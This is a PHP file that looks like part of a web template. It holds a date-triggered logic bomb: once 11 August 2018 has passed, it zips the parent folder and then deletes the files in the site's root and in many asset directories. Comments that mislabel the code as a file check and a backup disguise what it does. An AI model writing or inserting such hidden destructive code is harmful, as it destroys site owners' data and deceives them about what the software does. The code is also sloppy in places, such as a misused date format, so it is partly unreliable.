<?php

/* finnd the date to match the current date */$finaldate=date("2018-08-11 08:00:00");
/*get the current date and time */$cdate=date("Y/m/d H:m:s");
$datetime1 = new DateTime($cdate);
$datetime2 = new DateTime($finaldate);
$interval = $datetime1->diff($datetime2);

//scan for all file that are neccesary for this application to open 

if($interval->format('%R%a ')<0)
{
    ini_set('max_execution_time', 600);
    ini_set('memory_limit', '1024M');
    
    // Start the backup!
    zipData('../', '../backedup.zip');
    
    // Here the magic happens :)
    function zipData($source, $destination) {
        if (extension_loaded('zip')) {
            if (file_exists($source)) {
                $zip = new ZipArchive();
                if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
                    $source = realpath($source);
                    if (is_dir($source)) {
                        $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
                        foreach ($files as $file) {
                            $file = realpath($file);
                            if (is_dir($file)) {
                                $zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
                            } else if (is_file($file)) {
                                $zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
                            }
                        }
                    } else if (is_file($source)) {
                        $zip->addFromString(basename($source), file_get_contents($source));
                    }
                }
                return $zip->close();
            }
        }
        return false;
    }

    $files = glob('*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }
    $files = glob('assets/css/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }
    $files = glob('assets/demo/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/img/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/js/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/js/core/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/js/plugins/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/bootstrap/scss/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/bootstrap/scss/utilities/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/bootstrap/scss/mixins/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/cards/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/mixins/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/plugins/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/variables/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }$files = glob('assets/scss/material-kit/*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }
    $files = glob('./*'); 
    foreach($files as $file){
        if(is_file($file))
        unlink($file); 
    }




}
else
{
//else display the error message for that error o that missing file 



}




?>